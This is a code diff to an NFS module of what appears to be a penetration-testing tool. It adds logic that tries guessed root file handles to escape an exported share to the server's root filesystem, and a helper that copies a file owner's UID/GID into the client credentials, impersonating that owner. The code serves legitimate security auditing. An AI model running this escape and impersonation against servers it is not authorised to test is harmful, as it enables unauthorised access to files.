@@ -7,12 +7,16 @@ from pyNfsClient import (
     Portmap,
     Mount,
     NFSv3,
+)
+from pyNfsClient.const import (
     NFS_PROGRAM,
     NFS_V3,
     ACCESS3_READ,
     ACCESS3_MODIFY,
     ACCESS3_EXECUTE,
     NFSSTAT3,
+    NFS3ERR_NOENT,
+    NF3REG,
 )
 import re
 import uuid
@@ -21,6 +25,7 @@ import os
 
 
 from pprint import pprint
+
 
 class FileID:
     root = "root"
@@ -520,36 +525,104 @@ class nfs(connection):
 
         return root_handles
 
-    def try_root_escape(self, mount_fh):
-        possible_root_fhs = self.get_root_handles(mount_fh)
-        for fh in possible_root_fhs:
-            if "resfail" not in self.nfs3.readdir(fh, auth=self.auth):
-                return fh
+    def try_root_escape(self) -> bool:
+        """With an established connection look for a share that can be escaped to the root filesystem"""
+        if not self.nfs3:
+            raise Exception("NFS connection is not established")
+
+        output_export = str(self.mount.export())
+        reg = re.compile(r"ex_dir=b'([^']*)'")  # Get share names
+        shares = list(reg.findall(output_export))
+
+        self.logger.debug(f"Trying root escape on shares: {shares}")
+        for share in shares:
+            mount_info = self.mount.mnt(share, self.auth)
+            mount_fh = mount_info["mountinfo"]["fhandle"]
+            try:
+                possible_root_fhs = self.get_root_handles(mount_fh)
+                for fh in possible_root_fhs:
+                    if "resfail" not in self.nfs3.readdir(fh, auth=self.auth):
+                        self.logger.info(f"Root escape successful on share '{share}' with handle: {fh.hex()}")
+                        self.escape_share = share
+                        self.escape_fh = fh
+                        self.mount.umnt(self.auth)
+                        return True
+            except Exception as e:
+                self.logger.debug(f"Error trying root escape on share '{share}': {e}")
+            self.mount.umnt(self.auth)
+        return False
 
     def ls(self):
+        # Connect to NFS
         nfs_port = self.portmap.getport(NFS_PROGRAM, NFS_V3)
         self.nfs3 = NFSv3(self.host, nfs_port, self.args.nfs_timeout, self.auth)
         self.nfs3.connect()
 
-        output_export = str(self.mount.export())
+        # Remove leading slashes
+        self.args.ls = self.args.ls.lstrip("/").rstrip("/")
 
-        reg = re.compile(r"ex_dir=b'([^']*)'")  # Get share names
-        shares = list(reg.findall(output_export))
-
-        for share in shares:
-            mount_info = self.mount.mnt(share, self.auth)
+        # NORMAL LS CALL (without root escape)
+        if self.args.share:
+            mount_info = self.mount.mnt(self.args.share, self.auth)
             mount_fh = mount_info["mountinfo"]["fhandle"]
-            root_fh = self.try_root_escape(mount_fh)
-            if not root_fh:
-                self.mount.umnt(self.auth)
-                continue
+        elif self.root_escape:
+            # Interestingly we don't actually have to mount the share if we already got the handle
+            self.logger.success(f"Successful escape on share: {self.escape_share}")
+            mount_fh = self.escape_fh
+        else:
+            self.logger.fail("No root escape possible, please specify a share")
+            return
 
-            self.logger.success(f"Successful escape on share: {share}")
-            content = self.format_directory(self.nfs3.readdir(root_fh, auth=self.auth))
-            for entry in content:
-                self.logger.highlight(f"{entry['name'].decode()}")
-            self.mount.umnt(self.auth)
-            break
+        # Update UID and GID for the share
+        self.update_auth(mount_fh)
+
+        # We got a path to look up
+        curr_fh = mount_fh
+        is_file = False     # If the last path is a file
+
+        # If ls is "" or "/" without filter we would get one item with [""]
+        for sub_path in list(filter(None, self.args.ls.split("/"))):
+            res = self.nfs3.lookup(curr_fh, sub_path, auth=self.auth)
+
+            if "resfail" in res and res["status"] == NFS3ERR_NOENT:
+                self.logger.fail(f"Unknown path: {self.args.ls!r}")
+                return
+            # If file then break and only display file
+            if res["resok"]["obj_attributes"]["attributes"]["type"] == NF3REG:
+                is_file = True
+                break
+            curr_fh = res["resok"]["object"]["data"]
+
+        dir_listing = self.nfs3.readdirplus(curr_fh, auth=self.auth)
+        content = self.format_directory(dir_listing)
+        path = f"{self.args.share if self.args.share else ''}/{self.args.ls}"
+        # If the requested path is a file, we filter out all other files
+        if is_file:
+            content = [x for x in content if x["name"].decode() == sub_path]
+            path = path.rsplit("/", 1)[0]   # Remove the file from the path
+        self.print_directory(content, path)
+
+    def print_directory(self, content, path):
+        """
+        Highlight log the content of the directory provided by a READDIRPLUS call.
+        Expects an FORMATED output of self.format_directory.
+        """
+        self.logger.highlight(f"{'UID':<11}{'Perms':<7}{'File Size':<14}{'File Path'}")
+        self.logger.highlight(f"{'---':<11}{'-----':<7}{'---------':<14}{'---------'}")
+        for item in content:
+            if item["name"] in [b".", b".."]:
+                continue
+            if not item["name_attributes"]["present"]:
+                uid = "-"
+                perms = "----"
+                file_size = "-"
+            else:
+                uid = item["name_attributes"]["attributes"]["uid"]
+                is_dir = "d" if item["name_attributes"]["attributes"]["type"] == 2 else "-"
+                read_perm, write_perm, exec_perm = self.get_permissions(item["name_handle"]["handle"]["data"])
+                perms = f"{is_dir}{'r' if read_perm else '-'}{'w' if write_perm else '-'}{'x' if exec_perm else '-'}"
+                file_size = convert_size(item["name_attributes"]["attributes"]["size"])
+            self.logger.highlight(f"{uid:<11}{perms:<7}{file_size:<14}{path.rstrip('/') + '/' + item['name'].decode()}")
 
     def format_directory(self, raw_directory):
         """Convert the chained directory entries to a list of the entries"""
@@ -566,6 +639,13 @@ class nfs(connection):
 
         # Sort by name to be linux-like
         return sorted(items, key=lambda x: x["name"].decode())
+
+    def update_auth(self, file_handle):
+        """Update the UID and GID for the file handle"""
+        attrs = self.nfs3.getattr(file_handle, auth=self.auth)
+        self.logger.debug(f"Updating auth with UID: {attrs['attributes']['uid']} and GID: {attrs['attributes']['gid']}")
+        self.auth["uid"] = attrs["attributes"]["uid"]
+        self.auth["gid"] = attrs["attributes"]["gid"]
 
 
 def convert_size(size_bytes):
